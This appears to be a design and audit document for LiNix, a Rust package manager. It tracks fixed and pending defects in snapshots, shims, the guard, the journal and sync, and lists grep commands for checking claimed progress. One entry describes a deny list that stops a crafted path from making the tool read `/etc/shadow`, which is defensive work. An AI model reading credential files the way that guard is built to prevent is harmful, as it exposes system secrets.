| **E6** | "unmanaged" had two implementations that disagreed. **FIXED (Phase 2m).** `unmanaged` (II.8) is now *"what `adopt` would adopt"* — one crawl, `discover().adopt`, ~103 on a stock Ubuntu. The other question — every installed package LiNix does not manage, dependency closure and all, ~476 — is `installed_but_unmanaged()`, wanted only by `purge-unmanaged` (II.11). Same word, two questions, one answer each → **Phase 2** (fixed) |
| **E11** | ~~suspension restore implemented twice~~ **DONE 2026-07-17** — `sweep_due_suspensions` (timed) and `restore_session_suspensions` (shell-exit) carried byte-identical reinstall-and-clear loops; extracted one `App::restore_suspensions(items, occasion)` both call (`occasion` was the only difference, and only in log wording). `cargo check --lib` clean. → was **Phase 3** |
| **F1** | `network_timeout_secs` lies (`.max(10)` floor); `max_parallel` detected; `priority` reason in a comment → **Phase 5** |
| **F3** | ~884 marketing comments + **32 false ones** → **Phase 0**. The rule → `CLAUDE.md` → **Phase 5** |
| **F4** | 33 vs 50 backends. **(measured: 41 registration sites)** Compute it → **Phase 5** |
| **F5** | false doc comments → **Phase 5** |
| **G2** | ~~104 of 245 assertions are `soft` and cannot fail~~ **MOOT 2026-07-17** — the soft-assertion harness was removed in the v7 rewrite; grep finds no `soft`/`assert_soft`/`non_fatal` in src or tests. → **Phase 5** |
| **G3** | ~~teleport, adopt, shim, cockpit, undo unverified~~ **mostly DONE 2026-07-17** — shim/adopt/cockpit/undo now have tests; only `teleport`'s thin no-op/not-found branches remain (its core DAG is tested via dag_test). → **Phase 5** |
| **H2** | `sync/mod.rs:463`, `shell/mod.rs:126` → **Phase 5** |
| **S1** | ~~`reconcile_shims` is never called~~ — **this was false.** `sync` calls `reconcile_all_shims` on every successful run, which calls `remove_shim` for every managed package that is not shimmed. `remove_shim` deleted `~/.local/bin/<name>` by filename alone, with no check that LiNix created it — so a managed package named `jq` made every sync delete the user's own `~/.local/bin/jq`. `~/.local/bin` is shared. **Fixed in Phase 0f**: ownership is now tested (a shim is the linix binary under another name — same file as `current_exe`, or a byte-identical copy). Three regression tests added; they could not exist before because `bin_dir` was private with no injection point, which is why G3 lists shims as unverified. |
| — | `bundle` has no restore code and no end-to-end test → **Phase 4** |
| — | air-gap artifacts need the whole dependency tree, and most backends can't → **Phase 4** |

### Found during implementation

Each verified against the code at the time it was found, with the evidence in the commit
that recorded it. Assigned to the phase that owns the mechanism, not the phase that found it.

| | |
|---|---|
| **S2** | ~~**Age-based snapshot retention is dead for btrfs and ZFS.** Both providers' `list()` hardcode `timestamp: Utc::now()`, so `Snapshot::parse_time()` always returns *now* and every snapshot reads as zero seconds old.~~ **DONE (data-feeding fix), 2026-07-17.** Both `list()` methods now derive the real creation time from the id LiNix embeds when it creates a snapshot (`linix_pre_<label>_<YYYYMMDDHHMMSS>` / `<dataset>@linix_<YYYYMMDD_HHMMSS>`) via the new pure `Snapshot::time_from_id` — no dependency on btrfs/zfs reporting creation time, which varies by version. `retention.rs` was already correct, so `max_age_days`/`keep_days` now fire. **What I checked:** `cargo build --all-targets` clean; **5 unit tests written but NOT executed this session** (no-run constraint) — btrfs/zfs id round-trips (timezone-independent), age ordering, `None` for un-embedded ids, and the one-assertion regression (a week-old snapshot reads as ~7 days, not ~0). **Not covered:** an actual btrfs/zfs machine (untestable here) — but the risky part (the parse) is pure and tested. **Remaining Phase 4:** "one retention engine" (unifying the retention call paths) is a separate item; this fixes the data those paths consume. |
| **S3** | ~~**Snapshot retention never prunes Windows restore points.** The ownership filter is `id.contains("linix")`, but `WindowsRestoreProvider` sets `id` to a bare `SequenceNumber` (`"12"`) and puts the `LiNix:` marker in `description`.~~ **DONE, 2026-07-17.** New `Snapshot::is_linix_owned()` checks **both** id and description, case-insensitively (so `LiNix:` matches as well as `linix_`); the retention filter uses it instead of `s.id.contains("linix")`. Now the only such ownership check in `src/` (grep-verified). **What I checked:** `cargo build --all-targets` clean; **2 unit tests written but NOT run this session** — btrfs/zfs/Windows all recognized as owned, a Windows Update / manual snapshot left alone. |
| **S4** | ~~**`create_shim` overwrites any existing file at the target without asking.** Deliberate for redeploying a shim, but it silently destroys a same-named binary the user owns in `~/.local/bin`. `remove_shim` was fixed in Phase 0f to test ownership; the create path still does not.~~ **DONE, 2026-07-17.** `create_shim` now runs the same `is_deployed_shim` ownership check `remove_shim` uses before overwriting: a redeploy of LiNix's own shim proceeds, but an unmanaged same-named file is **refused** (`Error::Validation`), not clobbered. In auto-reconcile (every sync) the refusal is a non-fatal warning and the file is preserved; an explicit `linix shim` request propagates the error. **What I checked:** `cargo build --all-targets` clean; **1 unit test written but NOT run this session** — a user's `~/.local/bin/jq` survives `create_shim("jq")` unmodified and the call errors. Verified the two call paths (`reconcile_all_shims` warns; `context.rs` propagates) by reading them. |
| **S5** | ~~**`--progress` is a lie.** `#[arg(long, global = true, default_value = "true")]` on a `bool` — clap derives `ArgAction::SetTrue`, so it is always true and there is no way to turn it off.~~ **DONE, 2026-07-17.** It was also **dead** — `cli.progress` was read nowhere. Replaced with a plain `--no-progress` flag (a real `SetTrue` off-switch) wired in `load_and_merge_config` to set `config.show_progress = false`, which `create_progress_reporter` already consumes (`context.rs:82`, `services.rs:105`). **What I checked:** `cargo build --lib` and `--bin linix` both clean. `cargo build --all-targets` hit an **environment OOM** (os error 1455, "paging file too small") while linking a test binary — not a code error; lib+bin prove the code compiles. No unit test (it's a clap-wiring + config-merge change; the effect is `show_progress` flowing to the reporter). |
| **S6** | **Reporting DONE, 2026-07-17.** `heal()` no longer recovers silently: each recovered action is logged at **info** (`reinstalled apt:nginx (completing an interrupted install)`), and it ends with a one-line summary (`recovered N operation(s): …`) plus a `warn` list of any it could not recover — visible without `--verbose`. Successes were previously `debug!`, i.e. invisible, which is exactly P3's "didn't work and said nothing". `cargo check --lib` clean; no unit test (log-output change). **Deliberately NOT done — guard-on-heal-removal:** the decision text says a heal removal should route through the guard like any other, but heal *completes an operation the user already initiated and the WAL already recorded*; gating it on the guard means a protected/essential package caught mid-transaction could become **un-healable**, leaving the WAL permanently inconsistent. That trade-off is a real decision for the owner, not a blind wiring job, so it is flagged here rather than done. The original decision, unchanged: **`sync` heals without asking. DECIDED 2026-07-16: it should, and that is what declarative means.** A half-finished transaction is a state nobody declared — it is drift, and removing drift is sync's job → **Phase 3** |
| **S7** | **A crash left unhealed for 4 hours becomes unhealable.** `Journal::cleanup` reclassifies stale `InProgress` entries to `Abandoned`, and `get_incomplete_actions` (what `heal` acts on) excludes `Abandoned`. So the window to recover a crashed transaction silently closes. The 4h threshold is also a magic number with no stated reason (P5) → **Phase 5** |
| **S8** | **DONE, 2026-07-17.** `FORBIDDEN_PATHS` renamed to `REGISTRY_READ_FORBIDDEN_PATHS` with a comment saying it guards the snapshot-**registry-read** (diff) step only — the old name claimed a global "never touch" ban that `execute_restore` (which rolls all of `/` back) plainly violates. The refusal message now says it is refusing to *read a registry* from that path (a would-be arbitrary-file-read), not that the path is globally off-limits. And the restore confirmation now states plainly that it reverts the **entire filesystem** — every file, configs and data included, not just the packages in the summary — before asking for `RESTORE`. `undo` and the check are both kept, per the decision. `cargo check --lib` clean; no unit test (message/comment/rename change). *(Original decision, for context:)* **`undo` lies about scope; there is no safety hole. DECIDED 2026-07-16.** What `undo` does: list filesystem snapshots, mount the chosen one read-only, read the `registry.json` *inside* it, diff that against now, show a package-level summary, and on confirmation hand the snapshot to btrfs/timeshift to restore. `FORBIDDEN_PATHS` guards step 3 only — which directory `undo` will read a registry out of, so a crafted path cannot make it parse `/etc/shadow` as JSON. That is a real check doing a real job. Its *name and comment* claim "paths NEVER allowed to be accessed", and restore goes over `/` including all of them. So the defect is the false claim, not the check. **Keep** the check (renamed to say it guards the snapshot-read path); **delete** the global claim; **keep** `undo` (nothing else turns a snapshot into a package diff), but restore must state plainly that it rolls back the entire filesystem before asking. Gating restore on the list would refuse every root snapshot, i.e. delete `undo` by accident → **Phase 3** |
| **S9** | ~~`remove_package_from_local` (`parser.rs:290`) matches a bare target against the BACKEND prefix~~ — **FIXED in Phase 2e, and this row was stale in three ways (2026-07-17).** The function is gone (`grep` empty). The removal path is now `model/edit.rs:378` `matches()`, which parses each line **through the grammar** and compares `d.selector`, never the prefix; regression test at `edit.rs:669` (`npm:typescript` survives, `apt:npm` dies). **It did not "die with `local.txt`" — it died of `edit.rs`, and `local.txt` still has readers** (`insight.rs:418`). ~~→ **Phase 2**~~ **Nothing owed.** *(Both surviving prefix-splitters were checked for this defect shape and do not have it — `insight.rs:429` requires both halves, `manifest.rs:90` matches the name half.)* |
| **S10** | **`cargo test` wrote to the developer's REAL data dir**, and one bad file bricks every command. `TestKernel` (named `linix_hermetic_`) isolated `registry.json`, groups and tmp, but `Journal::new()` hardcoded `safe_data_dir()` — found at 733KB of test noise in `%APPDATA%/linix/journal.json`. Fixed in Phase 2b by injection (`Journal::at`). ~~**The remaining half is real:** `Journal::load_sync` errors on a bad parse -> `App::new` fails -> EVERY command fails, with no message saying which file to delete or how to recover.~~ **DONE, 2026-07-17.** `load_sync` no longer returns `Err` on a corrupt WAL: it moves the bad file aside to `<path>.corrupt` (preserved for inspection, and so it stops re-triggering), `warn`s loudly with the path and that an interrupted op can't be auto-recovered (re-run `sync`), and starts fresh — so `list`/`plan`/everything still run. Failing loud AND leaving a way out (P3). **What I checked:** `cargo check --lib` clean; **2 unit tests written but NOT run this session** — a corrupt WAL constructs successfully + gets moved to `.corrupt` off the live path; a missing WAL starts fresh. → was **Phase 5** |
| **S12** | **DONE (Phase 2o + 2p). All the extras now have somewhere to go.** They land in `DesiredState::extras`, which the old `resolve_desired_state` dropped because the seam carries `.packages` only; `sync` resolves the whole `DesiredState` now and applies the extras in II.7's ordering. **Phase 1 — `App::apply_repositories`:** `repo:` lines FIRST (add repo, refresh index) before the package plan, each repo naming its backend (V.47), a backend not in `priority` refused in the file (V.15). **Phase 3 — `App::apply_dependents`:** `shim:`, `service:`, `link:` AFTER the package plan executes — a shim wraps a tool that must already be installed, a service enables a unit a package just laid down, a link writes a config a package expects, so they are the *dependent* phase and cannot be interleaved with packages. Applied in declaration order (a config `link:` above the `service:` that reads it keeps that order). A dependents-only config (no package changes) still runs the phase — the "System matches" exit checks `has_dependents()`. Verified against the binary: `schedule:` warns (file:line), Flight plan installs the package, THEN service → link → shim preview. **Only `schedule:` is still unwired** — the scheduler owns it, not `sync` — and it is now the one line the resolver warns about. `watch` (the unattended `sync`) runs the same three phases now, so an unattended reconcile also adds repos and applies dependents. The **teardown** direction — reconciling away a *removed* extra — is tracked separately as **S20**. → **Phase 2** (forward direction done)
| **S20** | **DONE, 2026-07-17.** The applied-extras ledger is built. New pure `core/extras_lock.rs`: `ExtrasLedger` (→ `locks/extras.toml`, an ordered `BTreeSet` of extra keys), `extra_key(&Statement)` (`repo:apt:ppa:x/y`, `service:nginx`, `shim:rg`, `link:…`, `schedule:…`), `split_key`, and `drift(declared)` = recorded − declared. New `App::reconcile_extras` diffs the currently-declared extras against the recorded set, undoes the difference via each backend's existing removal path (`shim`→`remove_shim` (ownership-safe), `service`/`link`→`as_installable().remove`, `repo`→`as_repo_manager().remove_repo`, `schedule`→new config-free `SchedulerManager::deprovision`), then records the new set. Best-effort per item (a backend that can't undo one warns and the rest continue); dry-run previews and never writes; a no-op sync neither works nor rewrites the ledger. Wired as sync phase 5 in `handle_sync` (incl. the "System matches" early-exit, so **removing the last extra line still triggers the undo** — the exact bug) and `watch_reconcile`. **What I checked:** `cargo check --lib`/`--bin linix` clean; **6 unit tests written but NOT run this session** (key stability + parse, package-has-no-key, drift = recorded−declared, no drift when unchanged, a newly-declared extra isn't drift, TOML round-trip, missing-file-loads-empty). **Untested here:** the actual OS undo (systemctl/repo tools — none on this box); the ledger + diff + dispatch structure is what's covered. → was **Phase 4** |
| **S21** | **DONE, 2026-07-17.** All three parts wired: **(1)** the resolver now reads the `schedules` file in `statements()` via `parse_document` + `statements_for(facts)`, `when`-gated exactly like a module (absent file → no schedules). **(2)** New `App::apply_schedules` maps each line to a `ScheduleConfig` (new pure `model/schedule.rs::schedule_config`, which validates `cron`+`run` are present and rejects unknown keys) and provisions it through the new config-free `SchedulerManager::provision` (extracted `validate_cron` from `add_schedule`, no more duplicated cron logic); wired as II.7 phase 4 in `handle_sync` (dry-run aware) and `watch_reconcile`, and the "nothing to do" exit now accounts for schedules. **(3)** The file-context rule lives in `collect`: a `Statement::Schedule` whose origin is not the `schedules` file is an error naming the line and pointing at the right file. **What I checked:** `cargo check --lib` and `--bin linix` clean; **6 unit tests written but NOT run this session** (mapping happy-path, optional `notify`, missing `cron`/`run` errors, empty-cron-as-missing, unknown-key refusal). **Untested here:** the actual OS provisioning (systemd/launchd/Task Scheduler — no such runner on this box); only the line→config mapping, the file read, and the file-context rule are unit-covered. **Not done:** `init` does not scaffold an empty `schedules` file (not required — the resolver treats absent as "no schedules"). Was → Phase 5. |
| **S13** | **A bare name and an explicit one were two packages, not one.** `model::resolve` keys the merge on `backend:name`, and a bare `ripgrep` is keyed `?:ripgrep` until something probes it — so `ripgrep` in one module and `cargo:ripgrep` in another never met, never reconciled, and both reached the planner. Found while wiring the seam and **fixed there**: `Resolver::statements()` and `Resolver::collect()` are now separate, the caller probes in between, and `with_bare` hands the answers back so the merge sees real backends. II.7 rule 5 was silently not applying to every bare line → **Phase 2** (fixed) |
| **S19** | **`@lease=2h` still worked by hand, and it was the one option key that could uninstall your package. FIXED.** II.16 retired it — nothing LiNix writes used it — but `StateRegistry::add` still read `options["lease"]` and turned it into a real `expires_at`, and **the grammar validated no option keys at all**, so a hand-written `apt:jq@lease=2h` was silently a package that uninstalls itself, on the `sweep_expired_leases` path C3 says bypasses the guard. Both halves closed: **II.2's key table is now enforced by the grammar** (an unknown key is an error naming the file and line, and `@lease` gets a hint pointing at `@expires=<absolute>`), and `state.rs` no longer reads `lease`/`duration`. **This was Phase 1's job** — "unit tests for every grammar rule above, including every error case" — and II.2's table was the one rule with no test → **Phase 1** (fixed in 2l) |
| **S18** | **`auto_lock_checksums` rewrote your module files on every sync. FIXED (Phase 2n) by deletion.** It spliced `@sha256=…` into the line you wrote — II.16 says LiNix must not rewrite your files, and a checksum is a generated fact, which II.6 keeps in `locks/`. The whole `attempt_auto_lock` path is gone, and with it `ManifestEngine` (its last caller): a second file-editor with its own `split_once(':')` parser (C13), `load_locks`/`update_lock`/`manifest_files` all already dead. `groups_dir` refs 77 → 64. **The supply-chain intent survives, unbuilt:** recording an artifact's hash so a changed artifact is caught (II.12) belongs in `locks/<backend>.toml` → **Phase 4** (locks and git) |
| **S16** | **`--allow-mass-removal` deleted protected packages. FIXED.** `guard::enforce` returned `Ok(())` for *every* objection once the flag was set, so the flag meaning "yes, 50 packages is what I meant" also carried `python3` through. II.10 is explicit — `max_removals` exceeded → "cannot skip, `--allow-mass-removal`"; protected / OS-essential → **"nothing overrides"**. A confirmation asks; a refusal says no (V.26). The flag now clears only the count objection. **There was a test asserting the old behaviour** (`enforce_refuses_without_opt_in_and_proceeds_with_it`, which asserted the flag lets `python3` through) — the bug was written down as an expectation, which is why nothing caught it → **Phase 3** (fixed) |
| **S17** | **`[guard.enforce_on]` was a config key that switched the guard off, per command. DELETED.** Ten booleans — `apply`, `prune`, `sync`, `watch`, `upgrade`, `rollback`, `canary`, `remove`, `shell-exit`, `leases` — each of which made that command able to remove **anything, without limit**, protected and OS-essential included. It is not one of II.10's nine refusals; it is a switch that turns off all nine. V.21 says **no setting anyone can flip, inherit, or copy from a dotfiles repo** makes a routine sync delete something it did not install, and this was exactly that setting. The config template documented it, and `linix protected` printed which commands were unguarded. All gone → **Phase 3** (fixed) |
| **S15** | **`install` and `uninstall` both had P1 backwards. FIXED for both (`install` 2g, `uninstall` 2l).** P1 says an imperative command *is* a shortcut for editing a file and syncing, so the edit is the operation and the install is what convergence then does about it. Backwards, every refusal on the write landed *after* the package was on the machine. `install` is now `declare` -> `sync` (behind the guard for the first time; `--temp 2h` writes `@expires=<absolute>`). **`uninstall` is now `undeclare` -> `sync` too** (`main.rs:1182` edits the file, `:1190` calls `handle_sync`), so removal goes through the guard, the plan and the counts like any other drift — the symmetric pair V.39 describes. **Verified adversarially 2026-07-17: the old "still inverted, blocked on `prune_on_sync` default false" claim was stale in both halves** — `prune_on_sync`/`with_prune` are deleted (Phase 2h; only comments remain), and sync removes drift by definition (V.34). `uninstall --temp` is likewise done: it writes `absent:...@until=` (II.16). → **Phase 2** (done) |

| **S14** | **FIXED (Phase 2w).** `linix init` filled `priority` from `registry.available()`, which includes the pseudo-backends `service`, `link`, `web`, `github` — teaching a new user that the file answering *"which package managers, in what order"* contains four things that cannot resolve a package. `starter_order` now drops `service` and `link` (dependent statements, never priority-gated, never resolving a bare name). **`web`/`github`/`appimage` stay on purpose:** the model refuses an explicit `web:…` unless `web` is listed (V.15), so excluding them would break those specs — **the original S14 was imprecise to lump them in.** Test: `service_and_link_are_not_listed_but_artifact_backends_are`. *(The deeper "is this a package manager" capability probe the row imagined proved unnecessary: the two truly-not-managers are a fixed pair, and the rest legitimately need listing.)* → **Phase 2** (done) |
| **S11** | **The test harness is not hermetic by construction, only by remembering.** `LINIX_DATA_DIR` exists precisely so tests do not touch real state (`safe_data_dir` says so), the docker/windows integration scripts set it, and the cargo tests never did — nothing enforced it, so it rotted silently for as long as the journal has existed. G3's "unverified" list and this are the same problem: isolation that depends on each test author remembering → **Phase 5** (make it structural, not remembered) |

## VI.3 Do not re-decide these

Three suspicions did not survive scrutiny:

- `matches!(b, "choco"|"scoop"|"winget")` at `generic.rs:363` is the **only** such site, and
  its comment is the best in the repo.
- `.unwrap()` density: 192 total looks alarming, but outside tests the max is **5 in one
  file** and ≤2 elsewhere.
- `bisect`, `fleet`, `conflicts`, `generation` are real, unit-tested implementations, not
  stubs.

---

# Part VII — Where the work stands

**Living section. It is the one place that records progress — Part III stays the plan, this
says how far it got (P4).** Update it at the end of every session. Everything below was
verified against the tree at the commit that last touched this section, not recalled.

## The state at `HEAD` (2026-07-17)

- **68 commits** since `d49d28c`. *(The "49" that stood here was stale by 19 commits — an
  adversarial audit on 2026-07-17 ran `git rev-list --count d49d28c..HEAD`. The header drifted
  behind the tree it heads.)*
- **522 tests passing, 0 failing. `cargo clippy --all-targets` silent.** *(Measured on HEAD
  2026-07-17 after Phase 2x. The Phase-2-holding note below says "≈521" and Phase 2x's commit
  said "521" — the exact figure is 522; treat any single count as a tripwire, not a target.)*
- *Those two numbers tell you nothing about the line below them, and never could — every false
  ✅ in this document was green when it was written (rule 11). They are here because a **red**
  suite would be worth reporting, not because a green one is progress. **The 2026-07-17 audit
  found four more false claims and the suite never moved off 0 failing.***
- ~~Phase 0 ✅ · Phase 1 ✅~~ — **both false. See the audit immediately below.** ·
  **Phase 2 — the cliff is jumped; the command surface remains** · ~~Phases 3–6 not started~~ —
  **also false, and this one drifted *downward*.** Part III below marks a dozen Phase 3–5 items
  DONE with commits behind them (guard consolidation `a757bfb`, install ceiling, the II.12 hook
  ledger `2993c6c`, snapshot-age S2, F1 `d2472e3`/`c571b19`, H2 `c8c37b3`, P6 `e118e10`), and the
  2026-07-17 audit verified them real in the code — not self-graded ✅. Phases 3–5 are **partly
  built, not "not started"**; Phase 6 is untouched. A header that says nothing past Phase 2 began
  would send a cold reader to redo committed work.

## Audit: the ✅ that are not true (last run 2026-07-17, second pass)

**Phases 0 and 1 were marked ✅ before this section existed, and neither survives a grep.**
Checked by hand against the working tree, not recalled. **The suite is green and will stay
green through all of it: green means the old model still works, which is precisely the
problem.**

> **The second pass (2026-07-17) re-ran every command in this section and found the section
> itself was wrong in both directions.** One entry was **fixed and still filed**
> (`_active_profiles.txt` — with a retirement grep that could never have gone quiet), and
> C13's evidence had rotted so far that **four of the six sites it named did not exist** and its
> "Fixed when: 1" would have driven someone to delete a working validator. **Meanwhile it had
> missed three live ones** — `linix why`, `init -i`, and `activate`.
>
> **Phase 2's own account was the trusted one — "written from the work" — and it is where two of
> the three new findings were hiding.** `linix init` is ticked *"verified by running it"* and the
> wizard writes the old model; the `local.txt` row says `line_declares` is deleted and it is
> live with passing tests. **"Written from the work" is the same claim as "the tests pass": an
> observation standing in for the plan (rule 11).** Trust this section's *commands*. Do not
> trust its *prose*, including this paragraph.

> ### How to use this section — run it, don't read it
>
> **Every finding below is a command and the answer that means it is fixed.** At each phase
> change: **run the commands. Do not read the prose and believe it.** This section was
> written on a tree that is already moving, and by the time you read it some of it may be
> false — **that is the intended failure mode.** A finding that no longer reproduces is
> **not** a finding to argue with: **delete the entry, in the same commit as the fix.**
>
> When every entry is gone, **delete this whole section and restore the ✅** — to Phase 0 and
> Phase 1 in Part III, to C13 in VI.2, and to the status header at the top of this document.
> Those four places are where the false ✅ lived; they are where the true one goes.
>
> **Do not add findings here that are merely unbuilt.** This section is only for **work this
> document claims is finished and is not** — the failure that costs a reader their trust in
> every other ✅. Unbuilt work goes on the phase checklists, where it is honest.
>
> *(Why this is a ritual and not a note: this document has now been wrong about its own state
> every single time anyone checked — **always in the direction that flatters the tree**, and
> **every one was found by a grep, none by a reading.** That is the whole argument for making
> this a command you run rather than a paragraph you trust. See "A warning about this
> document" below.)*

### ~~Phase 1 ✅ / C13 "done" — one `backend:name` parser~~ — C13 CLOSED (verified 2026-07-17, adversarial re-audit)

**This entry is retired.** Every non-validating `backend:name` splitter is gone. The last one,
`lease set` (`main.rs:1410`), went with the retired `lease` command in Phase 2s — after an
earlier pass of this entry called it "the last skipper," which was true when written and stale
within the hour. Verified now against the tree:

```
grep -rn "split_once(':')" src/ | grep -v "^src/parsers/"
```
**7 hits, zero skippers.** Each remaining site either validates against the registry before
trusting a prefix (`grammar/statement.rs:328`/`:187`, `config/parser.rs:94`, `main.rs:686`), is
a name-half helper on an already-resolved key (`model/resolve.rs:522`), or is a comment
(`grammar/statement.rs:561`). This agrees with VI.2's C13 row (DONE, Phase 2r/2s) — the two had
disagreed, this one was the stale side.

**Phase 1's ✅ is a separate question and is NOT restored here.** C13 was only one of Phase 1's
findings; this entry retires the parser count, not Phase 1. Whoever restores Phase 1's ✅ must
confirm the II.2 grammar-rule findings (2q, S19) are all closed too, independently of C13.

### Phase 0 ✅ — "delete everything in II.17". Roughly 15% happened.

| marked deleted | actually | evidence |
|---|---|---|
| the `-g` model | ~~the model it anchored is not gone~~ — **now gone (Phase 2r), verified 2026-07-17.** `Config::groups_dir`/`modules_dir` are deleted; `grep -rn groups_dir src/` returns **one doc comment** (`insight.rs:399`), no field. *(The old
`policy.rs:3` citation died with `policy.rs` in the Phase 3 guard consolidation; re-grepped 2026-07-17.)* **`config_root()` is no longer `groups_dir.parent()`** — it returns the `config_root` field directly (`config.rs:416`) with the never-resolve-to-CWD guard. This row's old claim was stale in the "worse than reality" direction; it is retired. | `config.rs:416` |
| `local.txt` (V.1) | ~~alive in 10 files~~ ~~**dead as of Phase 2e**~~ — **the write is dead; the readers are not, and this row named a deletion that did not happen.** `add_package_to_local`, `remove_package_from_local`, `remove_package_from_manifests`, `get_user_group_file` and `ManifestEngine::add_to_local` are genuinely gone, and `model/edit.rs` replaces them — **S9 really did die** (`edit.rs:378` parses via the grammar; test at `:669`), **but of `edit.rs`, not of `local.txt`.** `line_declares` is **NOT deleted**: `insight.rs:418`, live, called at `:447`/`:463`, with passing tests at `:695`. `main.rs:3616` still wrote `local.txt` in `init -i` (being removed in the current working tree). **See the `linix why` entry above — this row is how it hid.** | `insight.rs:418` |
| `keep.txt` (V.6) | ~~alive~~ — **dead as of Phase 2e.** It was never *read*: the whole `RESERVED_MANIFEST_NAMES` / `is_reserved_manifest` mechanism existed only to keep one file out of a crawl. Mechanism and all four exclusion sites deleted. | fixed |
| `_active_profiles.txt` | ~~still written on every `activate`~~ — **dead as of Phase 2f.** `materialize()`, `compose()` (the second profile engine) and `RESERVED_MANIFEST` are deleted; `ProfileManager` runs on the model and `activate` edits one file, `active`. 657 lines -> 348. | fixed |
| `prune` (V.34) | **partly fixed in Phase 2h.** `prune_on_sync`, `prune_scope` and `protect_imperative` are deleted, and sync removes drift by definition. `snapshot prune` stays — V.34 says deleting the command leaves exactly one meaning of the word ("delete old history"), and that is it. `auto_prune` is snapshot retention, the same one surviving meaning. | fixed |
| `migrate` | **696 live lines**, called by `adopt`. Renamed, not deleted. ~~`migrate.rs:283` still tells the user to *"run `linix migrate` again"*~~ — **that message is gone (Phase 2k rewired `adopt` onto the new model);** `grep -rn "linix migrate" src/app/migrate.rs` is empty. The file **grew** (606→696) doing that rewiring, so this is not the pending deletion it reads as — it is live, working code the plan no longer wants to delete. | `main.rs:2153` |
| `clone` (V.33) | ~~a CLI command~~ — the command was gone, but **`fleet::clone` + `install_one` were still `pub` with zero callers**: Phase 0 deleted the flag and left the implementation. Deleted in Phase 2e. | fixed |
| ~884 marketing comments | **≈3,700 comment lines remain** in ≈41,600 lines of `src/` (~8.9%). **The count proves nothing on its own and is not the finding** — this one cannot be greped, so judge it by reading. The finding is that **the new `model/` files are writing spec-narration comments as the rule against them is being implemented**: `model/layout.rs:9` *"the fix for the shape of Monday's bug"*, `:135` *"which is Monday's bug (V.1)"*, `model/resolve.rs:162` *"the cost II.4 accepts knowingly"*. **V.42 is being broken by the code that cites V.42.** | `model/layout.rs:9,135` |

**Each row is one grep.** Fixed when each returns nothing:

```
grep -rn  "groups_dir" src/                                                  # ≈84
grep -rn  "config_root" src/                                                 # ≈25
grep -rln "local.txt" src/                                                   # ≈11 files
grep -rn  "_active_profiles\|RESERVED_MANIFEST" src/ | grep -v ^src/model/   # ≈7
grep -rn  "keep.txt" src/                                                     # live
grep -rn  "prune_on_sync\|auto_prune\|Prune" src/cli/ src/config/             # live
wc -l src/app/migrate.rs                                                      # ≈606, called by adopt
```

> **The counts are `≈` on purpose — do not treat them as a target, and do not "correct" them.**
> They drifted while this audit was being written (`config_root` 23→25, `local.txt` 10→11,
> minutes apart) because **more than one agent is committing to this tree.** A count is a
> tripwire, not a metric. **Only `0` means anything here.** If a number is merely different,
> the finding stands; it is retired when the grep is **quiet**, and never on the strength of
> the number having moved.

Delete each row as its grep goes quiet; restore Phase 0's ✅ when the last one does.

### Phase 2 — the II.1 layout: three of six paths have no reader

`Layout` defines the paths; only `priority` and `active` are actually read. **Zero callers
outside `layout.rs` and its own tests** for:

- `preferences_file()` — `layout.rs:84`. Nothing reads `preferences.toml`. II.10's refusals
  and V.43's nine guard rules have no source.
- `schedules_file()` — `layout.rs:69`. Live scheduling still reads `config.schedules` from
  `config.toml` (`scheduler/mod.rs:101`).
- ~~`locks_dir()` / `lock_file()` — `layout.rs:74-79`.~~ **Partly retired 2026-07-17:
  `locks_dir()` now has one real caller — `main.rs:3448`, which creates the directory in
  `scaffold_dirs`. Creating it is not reading it:** live locks still read the old
  `groups_dir.join("locks.json")` (`sync/resolver.rs:52`), so `lock_file()` remains unread and
  Phase 4 still owns this. **Two paths to one fact, again.**

```
grep -rn "preferences_file\|schedules_file\|locks_dir" src/ | grep -v model/layout.rs
```
**Now: one hit (`main.rs:3448`, `locks_dir`). Fixed when: a real caller for each of the three**
— which is the inverse of every other entry here, so read the result carefully. **A missing
name in that output means it is still broken**, and a name appearing does not mean it is read
— `locks_dir` is proof: it appears, and nothing reads a lock.
This entry is unusual: unlike the rest of the audit it is *unbuilt work, not a false ✅* —
it sits here only because Phase 2 is where it belongs and it is easy to mistake a path
helper with a passing test for a working file.

### `linix why` answers from the old model, and cannot see the new one (found 2026-07-17) — **FIXED**

**Fixed in Phase 2j. The diagnosis was right, including that it outranked C13.** `why` now
asks the resolver — `StateResolver::resolve_model()` — instead of re-reading the files with
its own parser. That is the point: `why` answers *"where is this declared?"*, which is the
question the model exists to answer, so a second implementation here was always going to be a
second answer, and it was the one a user reaches for when they already distrust the state.

- `scan_declarations`, `line_declares` (the 9th `split_once(':')` parser) and
  `interpret_source` are **deleted**, along with the test asserting `@module:` behaviour for a
  syntax this document deleted.
- **The answer is now a file and a line**: `at modules/dev.txt:2 (module:dev, profile:Work)`,
  taken from `__source` and `__scopes`. Verified against the binary on a II.1 repo — the exact
  case it previously could never see.
- **A `why` that cannot read your files now says so** rather than reporting "declared
  nowhere": `declarations_of` returns `Result` and the error names the file and line. Reporting
  a broken config as an absent declaration is the same failure in a quieter voice.
- **"Declared nowhere" is now an answer, not a blank**: *"in no active file — the next `sync`
  will remove it"*. That is drift, and saying it without saying what it means is how a true
  sentence still misleads.
- A lapsed line is reported as lapsed (II.16), not as the reason a package is present.

**The rest of the finding stands and is the next action.** `insight.rs` was one of nine files
holding `groups_dir`/`modules_dir`; 77 references remain across the tree.

**This is the new "most dangerous artifact", and it outranks C13.** Phase 2e's row below says
`line_declares` is **deleted**. It is alive at `app/insight.rs:418`, with its own passing unit
tests at `:695-705` — including `assert!(!line_declares("@module:htop", …))`, a test asserting
the behaviour of a syntax this document deleted.

```
grep -c "layout()\|Layout\|profiles_dir\|active_file" src/app/insight.rs      # 0. Fixed when: not 0.
```
**`insight.rs` does not contain the word `Layout`.** `why` (`insight.rs:477`) calls
`scan_declarations` (`:436`), which crawls `config.groups_dir` for `*.txt` and
`config.modules_dir` for **`*.module.txt`** (`:459`). II.1 modules are `modules/<name>.txt`
(`model/layout.rs:102`). **So `linix why` can never see a II.1 module** — wrong suffix — and it
never opens `profiles/` or `active` at all.

**Why this is the worst one in the section:** resolution runs on the new model (Phase 2d), so
`why` is now the command that *answers the question the new model exists to answer* — "where is
this declared?" — by reading the model that no longer decides. It does not error. It prints a
confident, sourced, wrong sentence, and **it is the command a user reaches for precisely when
they already distrust the state.** A false ✅ makes a reader skip work; this makes the tool lie
to a user who is checking.

**It is not a one-off.** `grep -rln "config\.groups_dir\|config\.modules_dir" src/` → **9 files**;
`services.rs`, `bundle.rs` and `config/manifest.rs` also score **0** for any Layout reference.
